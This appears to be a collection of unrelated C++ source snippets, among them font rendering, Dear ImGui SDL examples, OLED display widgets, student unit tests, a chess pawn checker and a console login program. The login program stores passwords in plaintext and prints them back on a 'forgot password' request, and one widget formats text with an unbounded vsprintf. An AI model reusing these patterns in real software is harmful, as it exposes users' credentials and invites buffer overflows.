ME_SIV(\"Freetype hasn't been inited!\",0);\n        return ME_EFONT_BAD_FREETYPE;\n    }\n    if(!buffer){\n        ME_SIV(\"empty data\",0);\n        return ME_ENO_DATA;\n    }\n    if(face)FT_Done_Face(face);\n    face = NULL;\n    FT_Error err = FT_New_Memory_Face(library,buffer,size,face_index,&face);\n    if(err)return err;\n\n    SetFormat(ME_FONT_ATTR_PARENT);\n\n    FT_Select_Charmap(face,FT_ENCODING_GB2312);\n    return ME_ENO_ERROR;\n}\n\nvoid MemFont::SetFormat(unsigned int att){\n    if(att | ME_FONT_ATTR_PARENT)att = attribute;\n    FT_Set_Pixel_Sizes(face,font_sizexy & ME_FONTSIZE_MASK,font_sizexy >> ME_FONTSIZE_OFFSET);\n}\n\nvoid MemFont::SetDefSize(unsigned short font_sizex,unsigned short font_sizey){\n    this->font_sizexy = ME_FONTSIZE(font_sizex,font_sizey);\n}\n\nvoid MemFont::SetDefAttribute(unsigned int attribute){\n    ///TODO:italic is processed in shader rather than here\n    this->attribute = attribute;\n}\n\nvoid MemFont::SetDefBoldStrength(unsigned short bx,unsigned short by){\n    bold_strengthxy = ME_BOLD(bx,by);\n}\n\nFT_GlyphSlot MemFont::LoadChar(FT_ULong charcode_gbk,unsigned int attri,FT_Render_Mode_ mode,bool render){\n    if(!face){\n        ME_SIV(\"Empty face\",0);\n        return NULL;\n    }\n    FT_Load_Char(face,charcode_gbk,FT_LOAD_DEFAULT);\n    SetFormat(attri);\n    if(attri & ME_FONT_ATTR_PARENT)attri = attribute;\n    if(attri & ME_FONT_ATTR_BOLD){\n        FT_Outline_EmboldenXY(&(face->glyph->outline),bold_strengthxy & ME_BOLD_MASK,bold_strengthxy >> ME_BOLD_OFFSET);\n    }\n    if(attri & ME_FONT_ATTR_ITALIC){\n        FT_Outline_Transform(&(face->glyph->outline),&italicMatrix);\n    }\n    if(render){\n        FT_Render_Glyph(face->glyph,mode);\n    }\n    SetFormat(attribute);\n    return face->glyph;\n}\n\nFT_GlyphSlot MemFont::LoadCharEx(FT_ULong charcode_gbk,unsigned int font_sizexy,unsigned int attri,FT_Render_Mode_ mode,bool render){\n    if(!face){\n        ME_SIV(\"Empty face\",0);\n        return NULL;\n    }\n    FT_UInt index = FT_Get_Char_Index(face,charcode_gbk);\n    FT_Load_Glyph(face,index,FT_LOAD_DEFAULT);\n    unsigned int oldxy = this->font_sizexy;\n    this->font_sizexy = font_sizexy;\n    SetFormat(attri);\n    if(attri & ME_FONT_ATTR_PARENT)attri = attribute;\n    if(attri & ME_FONT_ATTR_BOLD){\n        FT_Outline_EmboldenXY(&(face->glyph->outline),bold_strengthxy & ME_BOLD_MASK,bold_strengthxy >> ME_BOLD_OFFSET);\n    }\n    if(attri & ME_FONT_ATTR_ITALIC){\n        FT_Outline_Transform(&(face->glyph->outline),&italicMatrix);\n    }\n    if(render){\n        FT_Render_Glyph(face->glyph,mode);\n    }\n    this->font_sizexy = oldxy;\n    SetFormat(attribute);\n    return face->glyph;\n}\n\nvoid MemFont::GenChar(FT_Glyph & target,FT_ULong charcode_gbk,unsigned int attri,FT_Render_Mode_ mode,bool render){\n    FT_GlyphSlot glyph = LoadChar(charcode_gbk,attri,mode,render);\n    if(glyph)FT_Get_Glyph(glyph,&target);\n}\n\n///GlFont\nGlFont::GlFont(MemFont & mem,unsigned int width,unsigned int height,\n               unsigned int depth,unsigned int font_sizexy,\n               unsigned int def_atrribute,unsigned int bold_strengthxy)\n        :memfont(mem){\n    this->width = width;\n    this->height = height;\n    this->depth = depth;\n    charcodes_gb = frequencies = 0;\n    defGlyph = NULL;\n}\n\ninline void GlFont::SetSize(unsigned short x,unsigned short y){memfont.SetDefSize(x,y);};\ninline void GlFont::SetBoldStrength(unsigned short bx,unsign",
    "// dear imgui: Renderer Backend for SDL_Renderer for SDL2\n// (Requires: SDL 2.0.17+)\n\n// Note how SDL_Renderer is an _optional_ component of SDL2.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer currently offers a limited graphic API to the end-user and\n// it might be difficult to step out of those boundaries.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n// Missing features:\n//  [ ] Renderer: Multi-viewport support (multiple windows).\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n//  2024-05-14: *BREAKING CHANGE* ImGui_ImplSDLRenderer3_RenderDrawData() requires SDL_Renderer* passed as parameter.\n//  2023-05-30: Renamed imgui_impl_sdlrenderer.h/.cpp to imgui_impl_sdlrenderer2.h/.cpp to accommodate for upcoming SDL3.\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-12-21: Update SDL_RenderGeometryRaw() format to work with SDL 2.0.19.\n//  2021-12-03: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2021-10-06: Backup and restore modified ClipRect/Viewport.\n//  2021-09-21: Initial version.\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_impl_sdlrenderer2.h\"\n#include <stdint.h>     // intptr_t\n\n// Clang warnings with -Weverything\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wsign-conversion\"    // warning: implicit conversion changes signedness\n#endif\n\n// SDL\n#include <SDL.h>\n#if !SDL_VERSION_ATLEAST(2,0,17)\n#error This backend requires SDL 2.0.17+ because of SDL_RenderGeometry() function\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer2_Data\n{\n    SDL_Renderer*   Renderer;       // Main viewport's renderer\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer2_Data()   { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer2_Data* ImGui_ImplSDLRenderer2_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer2_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer2_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IMGUI_CHECKVERSION();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer2_Data* bd = IM_NEW(ImGui_ImplSDLRenderer2_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer2\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->Renderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer2_Shutdown()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer2_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    io.BackendFlags &= ~ImGuiBackendFlags_RendererHasVtxOffset;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer2_SetupRenderState(SDL_Renderer* renderer)\n{\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_RenderSetViewport(renderer, nullptr);\n\tSDL_RenderSetClipRect(renderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer2_NewFrame()\n{\n    ImGui_ImplSDLRenderer2_Data* bd = ImGui_ImplSDLRenderer2_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Context or backend not initialized! Did you call ImGui_ImplSDLRenderer2_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer2_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer",
    "// Dear ImGui: standalone example application for SDL2 + OpenGL\n// (SDL is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// **DO NOT USE THIS CODE IF YOUR CODE/ENGINE IS USING MODERN OPENGL (SHADERS, VBO, VAO, etc.)**\n// **Prefer using the code in the example_sdl2_opengl3/ folder**\n// See imgui_impl_sdl2.cpp for details.\n\n#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl2.h\"\n#include <stdio.h>\n#include <SDL.h>\n#include <SDL_opengl.h>\n\n// Main code\nint main(int, char**)\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0)\n    {\n        printf(\"Error: %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // From 2.0.18: Enable native IME.\n#ifdef SDL_HINT_IME_SHOW_UI\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n#endif\n\n    // Setup window\n    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 2);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 2);\n    SDL_WindowFlags window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);\n    SDL_Window* window = SDL_CreateWindow(\"Dear ImGui SDL2+OpenGL example\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);\n    SDL_GLContext gl_context = SDL_GL_CreateContext(window);\n    SDL_GL_MakeCurrent(window, gl_context);\n    SDL_GL_SetSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);\n    ImGui_ImplOpenGL2_Init();\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Roboto-Medium.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Cousine-Regular.ttf\", 15.0f);\n    //ImFont* font = io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\ArialUni.ttf\", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());\n    //IM_ASSERT(font != nullptr);\n\n    // Our state\n    bool show_demo_window = true;\n    bool show_another_window = false;\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    while (!done)\n    {\n        // Poll and handle events (inputs, window resize, etc.)\n        // You can read the io.WantCaptureMouse, io.WantCaptureKeyboard flags to tell if dear imgui wants to use your inputs.\n        // - When io.WantCaptureMouse is true, do not dispatch mouse input data to your main application, or clear/overwrite your copy of the mouse data.\n        // - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.\n        // Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.\n        SDL_Event event;\n        while (SDL_PollEvent(&event))\n        {\n            ImGui_ImplSDL2_ProcessEvent(&event);\n            if (event.type == SDL_QUIT)\n                done = true;\n            if (event.type == SDL_WINDOWE",
    "#include \"constitution.h\"\n\nnamespace altrupedia_constitution \n{\n\n// ==================== S_commands public methods ====================\nint \nS_commands::Execute(std::string const &theCommand)\n{\n    if (altrupedia_constitution::S_DOOR::BOUNCES(theCommand))\n    {\n        printf(\"S_commands::Execute: WARNING: %s is NOT conform.\\nReturning 1.\\n\", \n               theCommand.c_str());\n        return 1;\n    }\n    printf(\"S_commands::Execute(): INFO: theCommand '%s' is constitutional. Continuing..\\n\", theCommand.c_str());\n\n    switch (hashit(theCommand))\n    {\n        case kRegisterUser:\n            return executeRegisterUser();\n        case kDeleteUser:\n            return executeDeleteUser();        \n        default:\n            printf(\"S_commands::Execute(): WARNING: Command not found.\\n\");\n            return kUnknown;\n    }\n}\n\n// ==================== S_commands private methods ====================\nS_commands::E_cmd \nS_commands::hashit (std::string const& inString) \n{\n    if (inString == \"kRegisterUser\") return kRegisterUser;\n    if (inString == \"kDeleteUser\") return kDeleteUser;\n    return kUnknown;\n}\n\nint \nS_commands::executeRegisterUser()\n{\n    printf(\"S_commands::executeRegisterUser(): INFO: Registering user.\\n\");\n    return 0;\n}\n\nint \nS_commands::executeDeleteUser()\n{\n    printf(\"S_commands::executeDeleteUser(): INFO: Deleting user.\\n\");\n    return 0;\n}  \n\n// ==================== S_DOOR public methods ====================\nint \nS_DOOR::BOUNCES(std::string const &theRequest) \n{\n    if (theRequest == \"kRegisterUser\") return 0;\n    if (theRequest == \"kDeleteUser\") return 0;\n\n    printf(\"S_Door::Bounce(): WARNING: theRequest '%s' is NOT conform.\\nReturning non-zero.\\n\", \n               theRequest.c_str());\n    return 1;\n}\n\n\n} // namespace altrupedia_constitution",
    "#include <element.h>\n#include <ssd1306.h>\n\nIcon::Icon(int16_t posX, int16_t posY, uint8_t *icon, bool isInverse)\n    : posX(posX), posY(posY), icon(icon), iconH(iconHeight),\n      iconW(iconWidth), isInverse(isInverse) {}\n\nIcon::Icon(int16_t posX, int16_t posY, uint8_t *icon, int16_t w, int16_t h, bool isInverse)\n    : posX(posX), posY(posY), icon(icon), iconH(w),\n      iconW(h), isInverse(isInverse) {}\n\nvoid Icon::setBgColor(bool isInverse)\n{\n    if (this->isInverse != isInverse)\n    {\n        this->isInverse = isInverse;\n    }\n}\nvoid Icon::update()\n{\n    isUpdated = true;\n}\n\nvoid Icon::draw()\n{\n    ssd1036Display.drawBitmap(posX, posY, icon, iconW, iconH, isInverse ? INVERSE : WHITE);\n    isInverse ? ssd1036Display.setTextColor(BLACK, WHITE)\n              : ssd1036Display.setTextColor(WHITE);\n    ssd1036Display.display();\n}\n\nvoid Icon::setIcon(uint8_t *icon)\n{\n    if (this->icon != icon)\n    {\n        this->icon = icon;\n    }\n}\n\nvoid Icon::clear()\n{\n    ssd1036Display.clearDisplay();\n}\n\n// ================================\n// TextElem implement\n// ================================\nTextElem::TextElem(int16_t posX, int16_t posY, bool isInverse)\n    : posX(posX), posY(posY), isInverse(isInverse), algn(align_elm::AlignLeft)\n{\n}\nTextElem::TextElem(int16_t posX, int16_t posY, align_elm algn, bool isInverse)\n    : posX(posX), posY(posY), isInverse(isInverse), algn(algn)\n{\n}\nTextElem::TextElem(int16_t posX, int16_t posY, const char *str, align_elm algn, bool isInverse)\n    : posX(posX), posY(posY), isInverse(isInverse), algn(algn)\n{\n    setText(str);\n}\nvoid TextElem::setBgColor(bool isInverse)\n{\n}\nvoid TextElem::update()\n{\n    isUpdated = true;\n}\nvoid TextElem::draw()\n{\n    if (strlen(str) == 0)\n    {\n        return;\n    }\n    ssd1036Display.setTextSize(1); // 6x8 pixel\n    isInverse ? ssd1036Display.setTextColor(BLACK, WHITE)\n              : ssd1036Display.setTextColor(WHITE);\n    ssd1036Display.setCursor(posX, posY);\n    ssd1036Display.println(str);\n    ssd1036Display.display();\n}\nvoid TextElem::clear()\n{\n}\nvoid TextElem::setText(const char *str)\n{\n    if (strncmp(this->str, str, charSize) == 0)\n    {\n        return;\n    }\n    memcpy(this->str, str, charSize);\n    update();\n}\nvoid TextElem::setFormatText(const char *fmt, ...)\n{\n    char str_tmp[charSize];\n    va_list va;\n    va_start(va, fmt);\n    vsprintf(str_tmp, fmt, va);\n    va_end(va);\n    setText(str_tmp);\n}\n\n// ===================================\n// IconText class implement : TextElem\n// ===================================\nIconText::IconText(int16_t posX, int16_t posY, uint8_t *icon, bool isInverse)\n    : TextElem(posX + 16, posY+4, isInverse), icon(posX, posY, icon, isInverse) {}\nvoid IconText::setBgColor(bool isInverse) {}\nvoid IconText::update()\n{\n    isUpdated = true;\n    icon.update();\n    TextElem::update();\n}\nvoid IconText::draw()\n{\n    if (strlen(str) == 0)\n    {\n        if (isUpdated)\n        {\n            icon.clear();\n        }\n    }\n    else\n    {\n        icon.draw();\n    }\n    TextElem::draw();\n}\nvoid IconText::clear()\n{\n    icon.clear();\n    TextElem::clear();\n}\nvoid IconText::setIcon(uint8_t *icon)\n{\n    this->icon.setIcon(icon);\n}",
    "#include <gtest/gtest.h>\n\n#include \"22i-1042_A_A3.h\"\n\n\n\n// Test case\nTEST(Question_1, Test1) {\n\tstd::string str = \"mytttiiifsdjjojsadhsadunefwefwefwefdshjyiohdgwrg\";\n\tint k = 4;\n\tstd::string ans = \"ytttisdjjojsadhsadunefwefwefwefdshjyiohdgwrg\";\n    EXPECT_EQ(ans, largestString(str,k)); // This expectation will fail\n}\n\nTEST(Question_1, Test2) {\n\tstd::string str = \"codingisnofununtilyoudodsa\";\n\tint k = 8;\n\tstd::string ans = \"sofununtilyoudodsa\";\n\tEXPECT_EQ(ans, largestString(str, k)); // This expectation will fail\n}\n\nTEST(Question_1, Test3) {\n\tstd::string str = \"rebmasitohsui\";\n\tint k = 3;\n\tstd::string ans = \"rmsitohsui\";\n\tEXPECT_EQ(ans, largestString(str, k)); // This expectation will fail\n}\n\nTEST(Question_1, Test4) {\n\tstd::string str = \"farigballdamhadbj\";\n\tint k = 5;\n\tstd::string ans = \"rilldamhadbj\";\n\tEXPECT_EQ(ans, largestString(str, k)); // This expectation will fail\n}\n\nTEST(Question_1, Test5) {\n\tstd::string str = \"maajyutrrabcde\";\n\tint k = 2;\n\tstd::string ans = \"mjyutrrabcde\";\n\tEXPECT_EQ(ans, largestString(str, k)); // This expectation will fail\n}\n// Test case Question-2\nTEST(Question_2, Test1) {\n\tstd::string str = \"45\";\n\tint k = 1;\n\tstd::string ans = \"4\";\n\tEXPECT_EQ(ans, solve(str, k)); \n}\nTEST(Question_2, Test2) {\n\tstd::string str = \"96\";\n\tint k = 1;\n\tstd::string ans = \"6\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test3) {\n\tstd::string str = \"6789\";\n\tint k = 0;\n\tstd::string ans = \"6789\";\n\tEXPECT_EQ(ans, solve(str, k)); \n}\nTEST(Question_2, Test4) {\n\tstd::string str = \"6\";\n\tint k = 0;\n\tstd::string ans = \"6\";\n\tEXPECT_EQ(ans, solve(str, k)); \n}\nTEST(Question_2, Test5) {\n\tstd::string str = \"287948768\";\n\tint k = 0;\n\tstd::string ans = \"287948768\";\n\tEXPECT_EQ(ans, solve(str, k)); \n}\nTEST(Question_2, Test6) {\n\tstd::string str = \"53980517\";\n\tint k = 2;\n\tstd::string ans = \"380517\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test7) {\n\tstd::string str = \"37594852632\";\n\tint k = 10;\n\tstd::string ans = \"2\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test8) {\n\tstd::string str = \"739717549062896\";\n\tint k = 1;\n\tstd::string ans = \"39717549062896\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test9) {\n\tstd::string str = \"2233300000000000000\";\n\tint k = 3;\n\tstd::string ans = \"2200000000000000\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\n\nTEST(Question_2, Test10) {\n\tstd::string str = \"1766739498453158327826647316936982938316534805172218962557053186925224732\";\n\tint k = 2;\n\tstd::string ans = \"16639498453158327826647316936982938316534805172218962557053186925224732\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test11) {\n\tstd::string str = \"464038665066592229991395446868568141659015313318498114800229294263538051662670061878\";\n\tint k = 28;\n\tstd::string ans = \"13445141659015313318498114800229294263538051662670061878\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test12) {\n\tstd::string str = \"2910325986297865201398145278756\";\n\tint k = 27;\n\tstd::string ans = \"1001\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test13) {\n\tstd::string str = \"930879762870164\";\n\tint k = 10;\n\tstd::string ans = \"20164\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test14) {\n\tstd::string str = \"930879762870164\";\n\tint k = 7;\n\tstd::string ans = \"30270164\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test15) {\n\tstd::string str = \"98270191379642239801000\";\n\tint k = 17;\n\tstd::string ans = \"101000\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\nTEST(Question_2, Test16) {\n\tstd::string str = \"9130879762870164\";\n\tint k = 6;\n\tstd::string ans = \"1062870164\";\n\tEXPECT_EQ(ans, solve(str, k));\n}\n// Test case Question-3\nTEST(Question_3, Test1) {\n\tint arr[5] = { 1,2,3,4,5 };\n\tint arr2[1] = { 5 };\n\tint k = 1;\n\tint size = 5;\n\tint* result = maxSubsequence(arr, size, k);\n\tfor (int i = 0; i < k; i++)\n\t\tEXPECT_EQ(arr2[i], result[i]);\n}\n\nTEST(Question_3, Test2) {\n\tint arr[10] = { 3, -1, -2, 4, 6, -2, 2, 4, 6, -1 };\n\tint arr2[5] = { 6, -2 , 2 , 4 , 6 };\n\tint k = 5;\n\tint size = 10;\n\tint* result = maxSubsequence(arr, size, k);\n\tfor (int i = 0; i < k; i++)\n\t\tEXPECT_EQ(arr2[i], result[i]);\n}\n\nTEST(Question_3, Test3) {\n\tint arr[5] = { 0, 0 , 0 , 0 , 0};\n\tint arr2[5] = { 0, 0 , 0 , 0 , 0 };\n\tint k = 5;\n\tint size = 5;\n\tint* result = maxSubsequence(arr, size, k);\n\tfor (int i = 0; i < k; i++)\n\t\tEXPECT_EQ(arr2[i], result[i]);\n}\n\nTEST(Question_3, Test4) {\n\tint arr[5] = { -5,-1,-1,-1,-1 };\n\tint arr2[2] = { -1, -1};\n\tint k = 2;\n\tint size = 5;\n\tint* result = maxSubsequence(arr, size, k);\n\tfor (int i = 0; i < k; i++)\n\t\tEXPECT_EQ(arr2[i], result[i]);\n}\n\nTEST(Question_3, Test5) {\n\tint arr[8] = { 10, -5, 7, -3, 5, 1, -2, -6 };\n\tint arr2[5] = { 7, -3, 5, 1 };\n\tint k = 4;\n\tint size = 8;\n\tint* result = maxSubsequence(arr, size, k);\n\tfor (int i = 0; i < k; i++)\n\t\tEXPECT_EQ(arr2[i], result[i]);\n}\n\nint main(int argc, char ** argv) {\n  testing::InitGoogleTest( & argc, argv);\n  return RUN_ALL_TESTS();\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nclass temp {\r\n    string username, email, password;\r\n    fstream file;\r\npublic:\r\n    void Login();\r\n    void SignUP();\r\n    void Forgot();\r\n} obj;\r\n\r\nvoid temp::SignUP() {\r\n    cout << \"Enter Username: \";\r\n    cin.ignore(); // To clear the buffer\r\n    getline(cin, username);           //getline(): Reads an entire line of input, including spaces\r\n    cout << \"Enter Email address: \";\r\n    getline(cin, email);\r\n    cout << \"Enter Password: \";\r\n    getline(cin, password);\r\n\r\n    file.open(\"loginData.txt\", ios::out | ios::app);    //(ios::app), which means new data will be added at the end of the file.  //ios::out--used for data writing   ios::in--used for data\r\n    if (file.is_open()) {\r\n        file << username << \"*\" << email << \"*\" << password << endl;\r\n        file.close();\r\n        cout << \"Sign-Up successful!\" << endl;\r\n    } else {\r\n        cout << \"Error opening file!\" << endl;\r\n    }\r\n}\r\n\r\nvoid temp::Login() {\r\n    string searchuser, searchpass;\r\n    cout << \"--------------Login--------------\" << endl;\r\n    cout << \"Enter Username: \";\r\n    cin.ignore(); // To clear the buffer\r\n    getline(cin, searchuser);\r\n    cout << \"Enter Password: \";\r\n    getline(cin, searchpass);\r\n\r\n    file.open(\"loginData.txt\", ios::in);\r\n    if (file.is_open()) {\r\n        while (getline(file, username, '*')) {\r\n            getline(file, email, '*');\r\n            getline(file, password);\r\n\r\n            if (username == searchuser) {\r\n                if (password == searchpass) {\r\n                    cout << \"Account login successful\" << endl;\r\n                    file.close();\r\n                    return;\r\n                } else {\r\n                    cout << \"Incorrect password\" << endl;\r\n                    file.close();\r\n                    return;\r\n                }\r\n            }\r\n        }\r\n        cout << \"Username not found, try again\" << endl;\r\n        file.close();\r\n    } else {\r\n        cout << \"Error opening file!\" << endl;\r\n    }\r\n}\r\n\r\nvoid temp::Forgot() {\r\n    string searchuser, searchemail;\r\n    cout << \"Enter username: \";\r\n    cin.ignore(); // To clear the buffer\r\n    getline(cin, searchuser);\r\n    cout << \"Enter Email: \";\r\n    getline(cin, searchemail);\r\n\r\n    file.open(\"loginData.txt\", ios::in);\r\n    if (file.is_open()) {\r\n        while (getline(file, username, '*')) {\r\n            getline(file, email, '*');\r\n            getline(file, password);\r\n\r\n            if (username == searchuser && email == searchemail) {\r\n                cout << \"Account Found\" << endl;\r\n                cout << \"Your Password: \" << password << endl;\r\n                file.close();\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Account not found! Enter correct username and email.\" << endl;\r\n        file.close();\r\n    } else {\r\n        cout << \"Error opening file!\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    char choice;\r\n        cout << \"-->1. Login\" << endl;\r\n        cout << \"-->2. Sign-Up\" << endl;\r\n        cout << \"-->3. Forgot password\" << endl;\r\n        cout << \"-->4. Exit\" << endl;\r\n        cout << \"If you don't have an account, please Sign-Up.\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case '1':\r\n            obj.Login();\r\n            break;\r\n        case '2':\r\n            obj.SignUP();\r\n            break;\r\n        case '3':\r\n            obj.Forgot();\r\n            break;\r\n        case '4':\r\n            return 0;\r\n        default:\r\n            cout << \"Invalid Input\" << endl;\r\n        }\r\n\r\n    return 0;\r\n}",
    "#include \"Pawn.h\"\n\nint Pawn::checkLegalMove(Vector2i pos, Vector2i newPos, vector<vector<pieceType>> chessboard, bool color)\n{\n    /*\n        Funzione che controlla la validit\u00e1 della mossa \n    */\n    switch (color) // Controlla il colore del pezzo\n    {\n        // Bianco\n    case false:\n        // Verifica il caso in cui si vuole muovere di una casella\n        if (newPos.y == pos.y - 1)\n        {\n            // Verifica il caso in cui si muove nella casella frontale\n            if (chessboard[newPos.y][newPos.x] == pieceType::EMPTY && pos.x == newPos.x)\n                return 1;\n            // Verifica il caso in cui si muove nella casella laterale\n            if (chessboard[newPos.y][newPos.x] >= pieceType::BLACKPAWN && (pos.x == newPos.x - 1 || pos.x == newPos.x + 1))\n                return 1;\n        }\n        // Verifica il caso in cui il si vuole muovere di due caselle\n        if (pos.y == 6)\n        {\n            if (\n                (newPos.y == pos.y - 2 && pos.x == newPos.x)\n                && \n                (chessboard[newPos.y][newPos.x] == pieceType::EMPTY && chessboard[newPos.y + 1][newPos.x] == pieceType::EMPTY)\n               )\n                return 1;\n        }\n        break;\n\n        // Nero\n    case true:\n        // Verifica il caso in cui si vuole muovere di una casella\n        if (newPos.y == pos.y + 1)\n        {\n            // Verifica il caso in cui si muove nella casella frontale\n            if (chessboard[newPos.y][newPos.x] == pieceType::EMPTY && pos.x == newPos.x)\n                return 1;\n            // Verifica il caso in cui si 